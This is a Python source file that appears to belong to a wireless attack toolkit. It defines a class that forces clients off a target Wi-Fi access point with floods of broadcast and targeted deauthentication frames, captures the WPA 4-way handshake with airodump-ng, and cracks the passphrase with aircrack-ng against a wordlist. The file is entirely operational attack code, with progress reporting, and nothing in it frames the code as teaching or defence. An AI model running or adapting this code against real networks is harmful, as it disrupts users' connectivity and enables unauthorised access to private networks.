import subprocess
import os
import time
import threading
import asyncio
import json
from datetime import datetime
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf, sniff, Dot11Beacon, Dot11Elt
from scapy.layers.dot11 import Dot11
from .BaseAttack import BaseAttack

conf.verb = 0

class HandshakeCaptureAttack(BaseAttack):
    """
    Comprehensive Handshake Capture and Cracking Attack
    
    Features:
    - Monitor mode setup and channel management
    - Client discovery and targeted deauth
    - Robust handshake capture with airodump-ng
    - Enhanced handshake validation (4 EAPOL messages)
    - Password cracking with aircrack-ng
    - Real-time progress updates and status reporting
    - Comprehensive error handling and logging
    - Automatic managed mode restoration
    """
    
    def __init__(self, interface, ssid, bssid, channel, wordlist="/usr/share/wordlists/rockyou.txt", 
                 timeout=60, deauth_count=5, deauth_interval=2.0, websocket=None, 
                 output_dir="/tmp/airstrike_captures", restore_managed=True):
        
        # Initialize base class
        super().__init__(interface, websocket, "HandshakeCapture")
        
        # Attack-specific parameters
        self.ssid = ssid
        self.bssid = bssid.lower()
        self.channel = str(channel)
        self.wordlist = wordlist
        self.timeout = timeout
        self.deauth_count = deauth_count
        self.deauth_interval = deauth_interval
        self.output_dir = output_dir
        self.restore_managed = restore_managed
        
        # Handshake-specific state
        self.discovered_clients = set()
        self.capture_file = None
        self.handshake_captured = False
        self.cracking_status = "not_started"
        self.password_found = None
        
        # Enhanced handshake tracking
        self.eapol_messages = {
            'message_1': False,
            'message_2': False, 
            'message_3': False,
            'message_4': False
        }
        
        # Extend stats with handshake-specific fields
        self.stats.update({
            'eapol_packets': 0,
            'clients_targeted': 0,
            'handshake_captured': False,
            'cracking_status': 'not_started',
            'password_found': None,
            'eapol_messages': self.eapol_messages
        })
    
    def discover_clients(self):
        """Discover clients connected to the target AP with enhanced logging"""
        def packet_handler(pkt):
            if not self.running:
                return
            
            try:
                if pkt.haslayer(Dot11):
                    # Check for data frames from/to our target BSSID
                    if (pkt.addr1 and pkt.addr1.lower() == self.bssid) or \
                       (pkt.addr2 and pkt.addr2.lower() == self.bssid) or \
                       (pkt.addr3 and pkt.addr3.lower() == self.bssid):
                        
                        # Extract client MAC addresses
                        client_mac = None
                        if pkt.addr1 and pkt.addr1.lower() != self.bssid and not pkt.addr1.startswith('ff:ff'):
                            client_mac = pkt.addr1.lower()
                        elif pkt.addr2 and pkt.addr2.lower() != self.bssid and not pkt.addr2.startswith('ff:ff'):
                            client_mac = pkt.addr2.lower()
                        
                        if client_mac and client_mac not in self.discovered_clients:
                            self.discovered_clients.add(client_mac)
                            self.log_info(f"Client discovered: {client_mac}")
                            # Note: Status update will be sent from main thread
            except Exception as e:
                self.stats['errors'] += 1
                self.log_error(f"Client discovery error: {e}")
        
        # Start packet sniffing in a separate thread
        def sniff_clients():
            try:
                self.log_info(f"Starting client discovery on {self.interface}")
                sniff(iface=self.interface, prn=packet_handler, 
                     stop_filter=lambda x: not self.running, timeout=1)
            except Exception as e:
                error_msg = f"Client discovery error: {e}"
                self.log_error(error_msg)
        
        client_thread = threading.Thread(target=sniff_clients, daemon=True, name="client_discovery")
        client_thread.start()
        self.add_thread(client_thread)
        self.log_info("Client discovery thread started")
    
    def create_deauth_packet(self, client_mac="ff:ff:ff:ff:ff:ff"):
        """Create deauthentication packet with enhanced error handling"""
        try:
            # Create the deauth packet
            dot11 = Dot11(
                type=0,           # Management frame
                subtype=12,       # Deauthentication
                addr1=client_mac, # Destination (client or broadcast)
                addr2=self.bssid, # Source (AP)
                addr3=self.bssid  # BSSID
            )
            
            deauth = Dot11Deauth(reason=7)  # Reason: Class 3 frame received from nonassociated station
            
            # Combine with RadioTap header
            packet = RadioTap() / dot11 / deauth
            return packet
        except Exception as e:
            error_msg = f"Packet creation error: {e}"
            self.log_error(error_msg)
            return None
    
    def deauth_worker(self, target_client):
        """Worker thread for sending deauth packets to a specific client"""
        self.log_info(f"Starting deauth worker for {target_client}")
        
        deauth_packet = self.create_deauth_packet(target_client)
        if not deauth_packet:
            error_msg = f"Failed to create deauth packet for {target_client}"
            self.log_error(error_msg)
            return
        
        packets_sent = 0
        while not self.stop_signal.is_set():
            try:
                sendp(deauth_packet, iface=self.interface, count=self.deauth_count, 
                     inter=0.005, verbose=False)
                self.stats['packets_sent'] += self.deauth_count
                packets_sent += self.deauth_count
                
                # Log progress every 50 packets
                if packets_sent % 50 == 0:
                    self.log_info(f"Deauth worker {target_client}: {packets_sent} packets sent")
                
                # Wait for the specified interval
                if self.stop_signal.wait(self.deauth_interval):
                    break
                    
            except Exception as e:
                self.stats['errors'] += 1
                error_msg = f"Deauth worker error for {target_client}: {e}"
                self.log_error(error_msg)
                break
        
        self.log_info(f"Deauth worker {target_client} stopped after {packets_sent} packets")
    
    def validate_handshake(self, cap_file):
        """Enhanced handshake validation checking for all 4 EAPOL messages"""
        try:
            self.log_info(f"Validating handshake in {cap_file}")
            
            # Check for EAPOL packets
            result = subprocess.run(
                ["tshark", "-r", cap_file, "-Y", "eapol"],
                capture_output=True,
                text=True,
                check=True,
                timeout=20
            )
            output = result.stdout
            
            if "EAPOL" not in output:
                return False
            
            # Count EAPOL packets
            eapol_lines = [line for line in output.split('\n') if 'EAPOL' in line]
            self.stats['eapol_packets'] = len(eapol_lines)
            
            # Enhanced validation: Check for all 4 EAPOL messages
            self.eapol_messages = {
                'message_1': False,
                'message_2': False, 
                'message_3': False,
                'message_4': False
            }
            
            for line in eapol_lines:
                if "Message 1 of 4" in line:
                    self.eapol_messages['message_1'] = True
                elif "Message 2 of 4" in line:
                    self.eapol_messages['message_2'] = True
                elif "Message 3 of 4" in line:
                    self.eapol_messages['message_3'] = True
                elif "Message 4 of 4" in line:
                    self.eapol_messages['message_4'] = True
            
            # Check if we have all 4 messages
            all_messages = all(self.eapol_messages.values())
            
            if all_messages:
                self.log_success(f"Complete 4-way handshake validated! ({self.stats['eapol_packets']} EAPOL packets)")
                return True
            else:
                missing = [msg for msg, present in self.eapol_messages.items() if not present]
                self.log_info(f"Partial handshake detected ({self.stats['eapol_packets']} EAPOL packets) - Missing: {missing}")
                return False
                
        except subprocess.CalledProcessError as e:
            error_msg = f"Handshake validation failed: {e}"
            self.log_error(error_msg)
            return False
        except Exception as e:
            error_msg = f"Handshake validation error: {e}"
            self.log_error(error_msg)
            return False

    def crack_handshake(self, cap_file):
        """Enhanced password cracking with detailed logging and progress updates"""
        self.log_info(f"Starting password cracking for {cap_file}")
        
        if not os.path.exists(self.wordlist):
            self.cracking_status = "wordlist_not_found"
            error_msg = f'Wordlist not found: {self.wordlist}'
            self.log_error(error_msg)
            # Note: Status update will be sent from main thread
            return
        
        self.cracking_status = "cracking"
        # Note: Status update will be sent from main thread
        
        try:
            crack_cmd = [
                'aircrack-ng',
                '-w', self.wordlist,
                '-b', self.bssid,
                cap_file
            ]
            
            self.log_info(f"Running: {' '.join(crack_cmd)}")
            result = subprocess.run(crack_cmd, capture_output=True, text=True, timeout=300)
            
            self.log_info(f"aircrack-ng completed with exit code {result.returncode}")
            
            output = result.stdout
            if "KEY FOUND!" in output:
                for line in output.split('\n'):
                    if "KEY FOUND!" in line:
                        password = line.split('[')[1].split(']')[0]
                        self.password_found = password
                        self.cracking_status = "success"
                        success_msg = f'Password found: {password}'
                        self.log_success(success_msg)
                        # Note: Status update will be sent from main thread
                        break
            else:
                self.cracking_status = "failed"
                fail_msg = 'Password not found in wordlist'
                self.log_info(fail_msg)
                # Note: Status update will be sent from main thread
                
        except subprocess.TimeoutExpired:
            self.cracking_status = "timeout"
            timeout_msg = 'Cracking process timed out'
            self.log_error(timeout_msg)
            # Note: Status update will be sent from main thread
        except Exception as e:
            self.cracking_status = "error"
            error_msg = f"Password cracking error: {e}"
            self.log_error(error_msg)
            # Note: Status update will be sent from main thread

    def capture_worker(self):
        """Enhanced capture worker with robust error handling and detailed logging"""
        self.log_info(f"Starting capture worker for {self.bssid}")
        
        # Setup capture directory and files
        safe_bssid_name = self.bssid.replace(":", "-")
        output_dir = os.path.join(self.output_dir, safe_bssid_name)
        os.makedirs(output_dir, exist_ok=True)
        capture_prefix = os.path.join(output_dir, "capture")
        cap_file = f"{capture_prefix}-01.cap"
        self.capture_file = cap_file
        
        self.log_info(f"Capture files will be saved to: {output_dir}")
        
        WPA_handshake_captured = False
        capture_attempts = 0
        
        while not WPA_handshake_captured and not self.stop_signal.is_set():
            capture_attempts += 1
            self.log_info(f"Capture attempt {capture_attempts}")
            
            # Clean up old capture files
            cleanup_pattern = f"{capture_prefix}*"
            try:
                subprocess.run(f"rm -f {cleanup_pattern}", shell=True, check=False, 
                             stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                self.log_info("Cleaned up old capture files")
            except Exception as e:
                error_msg = f"Error during cleanup: {e}"
                self.log_error(error_msg)
            
            # Run airodump-ng
            airodump_cmd_list = [
                'airodump-ng',
                '--bssid', self.bssid,
                '--channel', str(self.channel),
                '-w', capture_prefix,
                self.interface
            ]
            
            self.log_info(f"Running: {' '.join(airodump_cmd_list)}")
            airodump_process = None
            
            try:
                airodump_process = subprocess.Popen(airodump_cmd_list, 
                                                  stdout=subprocess.DEVNULL, 
                                                  stderr=subprocess.DEVNULL)
                
                start_time = time.monotonic()
                while time.monotonic() - start_time < self.timeout:
                    if self.stop_signal.wait(timeout=0.2):
                        self.log_info("Stop signal received during capture")
                        break
                
                if airodump_process.poll() is None:
                    self.log_info(f"airodump-ng timeout reached ({self.timeout}s)")
                    airodump_process.terminate()
                    try:
                        airodump_process.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        self.log_info("airodump-ng did not terminate gracefully, killing")
                        airodump_process.kill()
                        
            except FileNotFoundError:
                error_msg = "airodump-ng not found. Is aircrack-ng installed?"
                self.log_error(error_msg)
                self.stop_signal.set()
                break
            except Exception as e:
                error_msg = f"Error running airodump-ng: {e}"
                self.log_error(error_msg)
                if airodump_process and airodump_process.poll() is None:
                    try:
                        airodump_process.terminate()
                        airodump_process.kill()
                    except: pass
                self.stop_signal.set()
                break
            finally:
                if airodump_process and airodump_process.poll() is None:
                    try:
                        airodump_process.terminate()
                        airodump_process.kill()
                    except: pass
            
            if self.stop_signal.is_set():
                break
            
            # Check for handshake
            if not os.path.exists(cap_file):
                self.log_info(f"Capture file {cap_file} not found, continuing...")
                time.sleep(2)
                continue
            
            self.log_info(f"Checking for handshake in {cap_file}")
            if self.validate_handshake(cap_file):
                WPA_handshake_captured = True
                self.handshake_captured = True
                success_msg = f'4-way handshake captured! ({self.stats["eapol_packets"]} EAPOL packets)'
                self.log_success(success_msg)
                # Note: Status update will be sent from main thread
                self.stop_signal.set()
                self.crack_handshake(cap_file)
                break
            else:
                self.log_info("No complete handshake found, retrying...")
                time.sleep(3)
        
        if WPA_handshake_captured:
            self.handshake_captured = True
            self.log_success(f"Handshake capture successful after {capture_attempts} attempts")
        else:
            self.handshake_captured = False
            self.log_info(f"Handshake capture failed after {capture_attempts} attempts")
        
        # Note: Status update will be sent from main thread instead of here
        self.log_info("Capture worker completed")
    
    def get_current_stats(self):
        """Get current attack statistics with enhanced information"""
        # Get base stats
        base_stats = super().get_current_stats()
        
        # Add handshake-specific stats
        handshake_stats = {
            'ssid': self.ssid,
            'bssid': self.bssid,
            'channel': self.channel,
            'eapol_packets': self.stats['eapol_packets'],
            'clients_discovered': len(self.discovered_clients),
            'clients_targeted': self.stats['clients_targeted'],
            'handshake_captured': self.handshake_captured,
            'cracking_status': self.cracking_status,
            'password_found': self.password_found,
            'eapol_messages': self.eapol_messages
        }
        
        # Determine the actual attack status
        if not self.running:
            attack_status = "stopped"
        elif self.handshake_captured:
            if self.cracking_status == "not_started":
                attack_status = "handshake_captured"
            elif self.cracking_status == "cracking":
                attack_status = "cracking"
            elif self.cracking_status == "success":
                attack_status = "success"
            elif self.cracking_status == "failed":
                attack_status = "failed"
            elif self.cracking_status == "timeout":
                attack_status = "timeout"
            elif self.cracking_status == "error":
                attack_status = "error"
            else:
                attack_status = "running"
        else:
            attack_status = "running"
        
        handshake_stats['status'] = attack_status
        
        # Merge base and handshake stats
        base_stats.update(handshake_stats)
        return base_stats
    
    async def start_attack(self):
        """Start the handshake capture attack with enhanced progress tracking"""
        try:
            self.log_info(f"Starting attack on {self.ssid} ({self.bssid})")
            await self.send_status_update('attack_starting', {
                'ssid': self.ssid,
                'bssid': self.bssid,
                'channel': self.channel,
                'wordlist': self.wordlist,
                'timeout': self.timeout
            })
            
            # Set monitor mode using base class method
            self.log_info(f"Setting monitor mode for {self.interface}")
            if not self.set_monitor_mode():
                self.log_error("Monitor mode setup failed")
                await self.send_status_update('error', {
                    'message': 'Failed to set monitor mode',
                    'errors': self.error_log
                })
                return False
            
            self.log_success("Monitor mode enabled successfully")
            self.stats['progress'] = 10
            await self.send_status_update('progress', {'progress': 10, 'message': 'Monitor mode enabled'})
            
            # Set channel using base class method
            self.log_info(f"Setting channel to {self.channel}")
            if not self.set_channel(int(self.channel)):
                self.log_error("Channel setting failed")
                await self.send_status_update('error', {
                    'message': f'Failed to set channel {self.channel}',
                    'errors': self.error_log
                })
                return False
            
            self.log_success("Channel set successfully")
            self.stats['progress'] = 15
            await self.send_status_update('progress', {'progress': 15, 'message': f'Channel set to {self.channel}'})
            
            # Start the attack
            self.log_info("Starting attack threads")
            self.running = True
            self.stop_signal.clear()
            self.stats['start_time'] = time.time()
            
            await self.send_status_update('attack_started', {
                'message': 'Handshake capture attack started',
                'target': f"{self.ssid} ({self.bssid})"
            })
            
            # Start client discovery
            self.log_info("Starting client discovery")
            self.discover_clients()
            self.stats['progress'] = 20
            await self.send_status_update('progress', {'progress': 20, 'message': 'Client discovery started'})
            
            # Start capture worker
            self.log_info("Starting capture worker")
            capture_thread = threading.Thread(target=self.capture_worker, daemon=True, name="capture_worker")
            capture_thread.start()
            self.add_thread(capture_thread)
            self.stats['progress'] = 30
            await self.send_status_update('progress', {'progress': 30, 'message': 'Capture started'})
            
            # Staggered start: wait before starting deauth
            self.log_info("Waiting 2 seconds before starting deauth...")
            time.sleep(2)
            
            # Start broadcast deauth worker immediately (targets all clients)
            self.log_info("Starting broadcast deauth worker")
            broadcast_deauth_thread = threading.Thread(
                target=self.deauth_worker, 
                args=("ff:ff:ff:ff:ff:ff",),  # Broadcast to all clients
                daemon=True,
                name="broadcast_deauth"
            )
            broadcast_deauth_thread.start()
            self.add_thread(broadcast_deauth_thread)
            self.stats['clients_targeted'] += 1
            self.stats['progress'] = 40
            await self.send_status_update('progress', {'progress': 40, 'message': 'Broadcast deauth started'})
            
            # Start deauth workers for discovered clients (if any)
            deauth_threads = []
            for client_mac in list(self.discovered_clients):
                if not self.running:
                    break
                
                self.log_info(f"Starting deauth worker for {client_mac}")
                deauth_thread = threading.Thread(
                    target=self.deauth_worker, 
                    args=(client_mac,),
                    daemon=True,
                    name=f"deauth_{client_mac}"
                )
                deauth_thread.start()
                self.add_thread(deauth_thread)
                deauth_threads.append(deauth_thread)
                self.stats['clients_targeted'] += 1
            
            if deauth_threads:
                self.stats['progress'] = 50
                await self.send_status_update('progress', {'progress': 50, 'message': f'Targeted deauth started for {len(deauth_threads)} clients'})
            
            self.log_info("Attack started successfully, entering main loop")
            self.stats['progress'] = 60
            await self.send_status_update('progress', {'progress': 60, 'message': 'Attack running - monitoring for handshake'})
            
            # Send periodic updates
            while self.running:
                await asyncio.sleep(3)
                self.log_info(f"Status update - running={self.running}, packets={self.stats['packets_sent']}, eapol={self.stats['eapol_packets']}")
                
                # Check for handshake capture if not already captured
                if not self.handshake_captured and self.capture_file and os.path.exists(self.capture_file):
                    self.log_info(f"Checking for handshake in {self.capture_file}")
                    if self.validate_handshake(self.capture_file):
                        self.handshake_captured = True
                        self.log_success(f"Handshake detected! ({self.stats['eapol_packets']} EAPOL packets)")
                
                # Check for handshake capture
                if self.handshake_captured and self.cracking_status == "not_started":
                    # Send handshake captured status
                    await self.send_status_update('handshake_captured', {
                        'message': f'4-way handshake captured! ({self.stats["eapol_packets"]} EAPOL packets)',
                        'capture_file': self.capture_file,
                        'eapol_count': self.stats['eapol_packets'],
                        'eapol_messages': self.eapol_messages
                    })
                    # Send cracking started status
                    await self.send_status_update('cracking_started', {
                        'message': 'Starting password cracking...',
                        'wordlist': self.wordlist
                    })
                    self.stats['progress'] = 70
                    await self.send_status_update('progress', {'progress': 70, 'message': 'Handshake captured - starting cracking'})
                elif self.cracking_status == "cracking":
                    self.stats['progress'] = 80
                    await self.send_status_update('progress', {'progress': 80, 'message': 'Password cracking in progress'})
                elif self.cracking_status == "success":
                    # Send password found status
                    await self.send_status_update('password_found', {
                        'message': f'Password found: {self.password_found}',
                        'password': self.password_found
                    })
                    self.stats['progress'] = 100
                    await self.send_status_update('progress', {'progress': 100, 'message': 'Attack completed successfully'})
                    self.log_info(f"Attack completed with status: {self.cracking_status}")
                    break
                elif self.cracking_status == "failed":
                    # Send cracking failed status
                    await self.send_status_update('cracking_failed', {
                        'message': 'Password not found in wordlist'
                    })
                    self.stats['progress'] = 100
                    await self.send_status_update('progress', {'progress': 100, 'message': 'Attack completed - password not found'})
                    self.log_info(f"Attack completed with status: {self.cracking_status}")
                    break
                elif self.cracking_status == "timeout":
                    # Send cracking timeout status
                    await self.send_status_update('cracking_timeout', {
                        'message': 'Cracking process timed out'
                    })
                    self.stats['progress'] = 100
                    await self.send_status_update('progress', {'progress': 100, 'message': 'Attack completed - cracking timed out'})
                    self.log_info(f"Attack completed with status: {self.cracking_status}")
                    break
                elif self.cracking_status == "error":
                    # Send cracking error status
                    await self.send_status_update('cracking_error', {
                        'message': 'Password cracking error occurred'
                    })
                    self.stats['progress'] = 100
                    await self.send_status_update('progress', {'progress': 100, 'message': 'Attack completed - cracking error'})
                    self.log_info(f"Attack completed with status: {self.cracking_status}")
                    break
                elif self.cracking_status == "wordlist_not_found":
                    # Send wordlist error status
                    await self.send_status_update('cracking_error', {
                        'message': f'Wordlist not found: {self.wordlist}',
                        'error': 'wordlist_not_found'
                    })
                    self.stats['progress'] = 100
                    await self.send_status_update('progress', {'progress': 100, 'message': 'Attack completed - wordlist not found'})
                    self.log_info(f"Attack completed with status: {self.cracking_status}")
                    break
                
                # Send regular stats update
                await self.send_status_update('stats_update', self.get_current_stats())
                
                # Check if attack completed
                if self.cracking_status in ['success', 'failed', 'error', 'timeout', 'wordlist_not_found']:
                    break
            
            # Send final capture complete status
            await self.send_status_update('capture_complete', {
                'message': 'Capture thread stopped',
                'handshake_captured': self.handshake_captured,
                'capture_file': self.capture_file,
                'attempts': 1  # We'll track this properly if needed
            })
            
            self.log_info(f"Attack loop ended, running={self.running}")
            return True
            
        except Exception as e:
            self.log_error(f"Attack start error: {e}")
            await self.send_status_update('error', {
                'message': f'Attack failed to start: {e}',
                'errors': self.error_log
            })
            return False
    
    async def stop_attack(self):
        """Stop the handshake capture attack and restore managed mode"""
        self.log_info("Stopping handshake capture attack")
        
        self.running = False
        self.stop_signal.set()
        
        # Wait a moment for threads to stop
        time.sleep(1)
        
        # Use base class cleanup
        self.cleanup()
        
        # Restore managed mode if requested
        if self.restore_managed:
            self.log_info("Restoring managed mode")
            self.set_managed_mode()
        
        final_stats = self.get_current_stats()
        await self.send_status_update('attack_stopped', {
            'message': 'Handshake capture attack stopped',
            'final_stats': final_stats,
            'errors': self.error_log if self.error_log else None
        })
        
        self.log_success("Attack stopped successfully")
        return final_stats 